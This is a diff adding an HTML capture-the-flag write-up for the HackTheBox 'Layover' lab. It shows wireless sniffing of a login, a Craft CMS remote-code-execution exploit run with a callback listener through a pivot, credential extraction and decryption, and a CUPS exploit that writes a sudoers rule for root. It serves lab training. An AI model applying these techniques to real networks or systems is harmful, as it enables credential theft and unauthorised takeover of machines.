@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Layover - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Layover (Medium, Linux) write up: WiFi traffic capture, Craft CMS RCE, credential recovery, and CUPS privilege escalation."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--border:rgba(255,255,255,.06);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280;--purple:#c084fc;--emerald:#34d399}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08),transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}.icon-sm{width:14px;height:14px}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;overflow:hidden}.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}h1{font-size:1.75rem;font-weight:800;text-transform:uppercase;margin-bottom:1.5rem}@media(min-width:768px){h1{font-size:2.5rem}}
+h2{font-size:1.25rem;color:var(--purple);margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}p,li{color:var(--muted);font-size:.95rem;line-height:1.75}p{margin-bottom:1rem}ul{margin:0 0 1rem 1.25rem}li{margin-bottom:.25rem}strong{color:var(--text)}a{color:var(--purple)}code{font-family:monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:var(--purple);padding:2px 6px;border-radius:6px}pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font: .8rem/1.6 monospace;color:var(--emerald);white-space:pre-wrap;overflow-wrap:anywhere}.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}.lbl{color:var(--dim);font: .65rem monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}.val{font-size:.9rem;font-weight:600}.tag{display:inline-block;padding:2px 10px;border-radius:9999px;font:.7rem monospace;letter-spacing:.1em;text-transform:uppercase}.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}.tag-linux{background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.3);color:var(--purple)}.footer{text-align:center;padding-top:3rem;color:var(--dim);font:10px monospace;letter-spacing:.15em;text-transform:uppercase}
+</style>
+</head>
+<body><div class="cyber-grid"></div><main><div class="max-w">
+<div class="nav-row"><a href="../writeups.html" class="back-btn"><svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>Write Ups</a><a href="../index.html" class="back-btn">Home</a></div>
+<div class="panel"><div class="writeup-body">
+<p class="meta">hackthebox / medium / linux</p><h1>Layover</h1>
+<div class="info-grid"><div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div><div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="tag tag-medium">Medium</span></div></div><div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="tag tag-linux">Linux</span></div></div></div>
+
+<h2>Summary</h2>
+<p>Layover uses a staged attack path. A provided contractor account grants RDP access to a Linux workstation, where a second wireless adapter can be placed in monitor mode to capture another client's HTTP login request. The recovered Craft CMS credentials expose an internal portal, and a Craft CMS vulnerability provides code execution on the web server. From there, encrypted application settings reveal SSH credentials for <code>aporter</code>. The final escalation abuses a vulnerable local CUPS service to write a sudoers rule and obtain root.</p>
+
+<h2>Enumeration</h2>
+<pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-02 18:00 -0400
+Nmap scan report for 10.129.112.236
+Host is up (0.072s latency).
+Not shown: 61271 closed tcp ports (reset), 4262 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</pre>
+<p>The initial scan exposes SSH and RDP. The supplied contractor credentials are intended for the RDP service:</p>
+<p>Credentials provided: <code>contractor / Contractor2026!</code></p>
+<p>Connect using xfreerdp:</p>
+<pre>xfreerdp /v:10.129.112.236 /u:contractor /p:Contractor2026!</pre>
+<p>After connecting to the <code>HTB International WiFi</code> network, a browser window appears. The workstation contains Wireshark and TShark, suggesting that the RDP host is part of the intended attack path rather than merely a jump box.</p>
+
+<h2>WiFi Traffic Capture</h2>
+<p>Wireshark and TShark are installed on the workstation, so the next step is to inspect wireless traffic for HTTP requests. A managed wireless interface normally receives only frames addressed to the local host, subject to filtering performed by the driver or firmware. It does not provide a complete view of traffic on the channel. In 802.11, capturing the host's traffic and capturing traffic over the air are different operations.</p>
+<p>For this reason, <code>wlan3</code> must be placed in monitor mode. In that mode it receives raw 802.11 frames on the channel, including the other client's POST request. <code>wlan2</code>, left in managed mode, does not expose that traffic because the driver filters frames it does not consider relevant to the host.</p>
+<pre>Stop anything managing wlan3
+sudo systemctl stop NetworkManager
+sudo systemctl stop wpa_supplicant 2&gt;/dev/null
+sudo killall wpa_supplicant 2&gt;/dev/null
+
+Force wlan3 into monitor mode
+sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+
+Confirm it worked
+iw dev wlan3 info        # Type should say "monitor"
+ip link show wlan3       # Should show &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; now
+
+Tune to the AP's channel
+sudo iw dev wlan3 set channel 6
+
+Confirm channel
+iw dev wlan3 info        # Should show "channel 6 (...)"</pre>
+<p>With the adapter configured, filter for HTTP POST requests and print the form fields:</p>
+<pre>sudo tshark -i wlan3 -Y 'http.request.method==POST' -T fields -e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+
+Capturing on 'wlan3'
+Oct  3, 2026 10:11:36.579980942 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!</pre>
+
+<h2>Foothold</h2>
+<p>The capture reveals a login to <code>portal.international.htb</code>. The administrative endpoint can be reached at <code>http://portal.international.htb/admin</code>; the path can be guessed or discovered with directory enumeration. The captured credentials authenticate to Craft CMS 5.9.8.</p>
+<p>The portal is not directly convenient to exploit from the attacking machine, so Ligolo-ng is used to route traffic through the RDP workstation:</p>
+<pre># On kali run the proxy:
+sudo ./proxy -selfcert
+
+# On the rdp session after transfering the agent
+./agent -connect &lt;kali-ip&gt;:11601 -ignore-cert
+
+# On kali:
+sudo ip route replace 10.13.37.0/24 dev ligolo</pre>
+<p>The Craft CMS exploit used is <a href="https://github.com/4xura/CVE-2026-44011-craftcms-auth-rce">CVE-2026-44011-craftcms-auth-rce</a>. Because the exploit callback must reach the attacker's listener through the pivot, a Ligolo listener forwards the callback port.</p>
+<pre>1. Keep exploit listener running on your machine
+It listens on:
+0.0.0.0:42391
+2. In the Ligolo proxy console, select the active agent and create a listener:
+listener_add --addr 0.0.0.0:42391 --to 127.0.0.1:42391
+This means:
+&gt; Listen on the pivot machine’s interfaces, then forward received traffic through Ligolo to your local listener.
+3. Find the agent machine’s reachable WLAN IP
+On the RDP/agent machine:
+ip -br addr
+Example:
+wlan3  10.13.37.131/24
+4. Run the exploit using that address:
+python cve-2026-44011.py \
+  -b 'http://10.13.37.10/' \
+  -u 'jenny' \
+  -p 'Fl1ghtDeck2026!' \
+  -c 'id' \
+  --callback-host 10.13.37.131 \
+  --listen-port 42391</pre>
+<pre>command output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+<p>The <code>id</code> test returns <code>www-data</code>, confirming code execution. Set up a listener on the RDP connection, then run the exploit again with an RCE payload to obtain a shell.</p>
+
+<h2>Credential Recovery</h2>
+<p>Once execution is available as <code>www-data</code>, inspect the application source and environment. The database credentials are present directly in <code>login.php</code>:</p>
+<pre>cat login.php
+  $db = @new mysqli('127.0.0.1', 'craftuser', 'CraftDB_pw_2026', 'craft');</pre>
+<p>The same database credentials, along with the Craft security key and deployment settings, are present in <code>.env</code>:</p>
+<pre># General settings
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026</pre>
+<pre>mysql -h 127.0.0.1 -u craftuser -p'CraftDB_pw_2026'
+
+select id,username,password from users;
++----+----------+--------------------------------------------------------------+
+| id | username | password                                                     |
++----+----------+--------------------------------------------------------------+
+|  1 | admin    | $2y$13$ZdTZwteklJx2.z6sEY35pehuiOsB28y3sGJTNozu.xTpYRe4MCGg2 |
+|  2 | jenny    | $2y$13$abHJk/QQLb8BE4L2pkBblebjEeWCMyFAdwguN2d7rDHZnnHJWvG7q |
++----+----------+--------------------------------------------------------------+</pre>
+<p>The database contains hashes for the Craft users. Attempting to crack the administrator hash with hashcat is a dead end; it is not recovered. The application database still contains another useful table, however:</p>
+<pre>select * from htbairways_settings;
+
+mailRelayPassword | u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
+mailRelayUser     | aporter
+
+php craft exec 'var_dump(Craft::$app-&gt;security-&gt;decryptByKey(base64_decode("u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=")));'
+
+Skyp0rt_Relay!26</pre>
+<pre>user: aporter
+pass: Skyp0rt_Relay!26</pre>
+<p>Decrypting the value with Craft's own security component reveals <code>Skyp0rt_Relay!26</code>. The corresponding account is <code>aporter</code>:</p>
+<p>SSH as <code>aporter</code> and retrieve the user flag.</p>
+
+<h2>Privilege Escalation</h2>
+<pre>ss -tulnp
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+udp   UNCONN 0      0         127.0.0.54:53        0.0.0.0:*
+udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*
+tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
+tcp   LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*
+tcp   LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*
+tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*
+tcp   LISTEN 0      4096      127.0.0.53%lo:53        0.0.0.0:*
+tcp   LISTEN 0      4096       127.0.0.1:631       0.0.0.0:*
+tcp   LISTEN 0      4096           [::]:22           [::]:*
+tcp   LISTEN 0      511             [::]:80           [::]:*
+tcp   LISTEN 0      4096           [::1]:631          [::]:*</pre>
+<p>Port 631 is bound only to loopback, making it inaccessible from the external network but reachable from the SSH session. Querying it identifies CUPS 2.4.16:</p>
+<pre>aporter@portal:/etc/cups$ curl http://localhost:631
+curl http://localhost:631
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+    &lt;META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"&gt;
+    &lt;TITLE&gt;Not Found - CUPS v2.4.16&lt;/TITLE&gt;
+    &lt;LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css"&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;H1&gt;Not Found&lt;/H1&gt;
+&lt;P&gt;&lt;/P&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;</pre>
+<p>CUPS v2.4.16 matches <a href="https://github.com/predyy/CVE-2026-34990">CVE-2026-34990</a>. Transfer <code>poc.py</code> to the RDP workstation and then to <code>aporter</code>, using two temporary Python HTTP servers if needed: <code>python -m http.server 80</code>.</p>
+<p>Run the exploit:</p>
+<pre>python3 poc.py
+[*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
+[*] coercing cupsd → rogue server ...
+[+] captured token: E6D1B92F6D23076EA722FD04137CA97E
+[*] writing sudoers ...
+[+] wrote /etc/sudoers.d/aporter-pwn
+[+] ROOT: uid=0(root) gid=0(root) groups=0(root)
+[*] run: sudo -i
+
+sudo -i
+root@portal:~# cat /root/root.txt</pre>
+<p>The exploit coerces <code>cupsd</code> into contacting the rogue server, captures an authorization token, and writes <code>/etc/sudoers.d/aporter-pwn</code>. The resulting sudo rule provides a root shell:</p>
+<p>Run <code>sudo -i</code> and retrieve the root flag.</p>
+</div></div><p class="footer">pumkin / write ups</p>
+</div></main></body></html>
